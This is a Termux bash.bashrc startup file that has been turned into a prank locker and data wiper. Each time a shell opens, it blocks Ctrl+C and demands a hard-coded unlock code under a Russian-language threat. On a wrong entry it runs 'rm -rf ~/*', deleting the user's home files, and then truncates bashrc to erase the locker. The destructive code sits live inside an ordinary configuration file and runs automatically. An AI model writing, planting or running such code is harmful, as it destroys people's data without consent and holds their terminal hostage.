if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
        command_not_found_handle() {
                /data/data/com.termux/files/usr/libexec/termux/command-not-found "$1"
        }
fi

PS1='\$ '

trap '' 2
read -p "Терминал заблокирован. Для разблокировки
введите код. При неправильной попытке ввода все
локальные файлы Termux будут удалены. Код: " code;
if [ $code = "ИдиУчиБаш" ]; then
    echo hello
else
    echo "Неверный код."
    echo "Очистка термукса..."
    sleep 2
    echo "Термукс очищен."
    rm -rf ~/*
    trap 2
    head -n +7 ~/../usr/etc/bash.bashrc > temp; mv temp ~/../usr/etc/bash.bashrc
fi
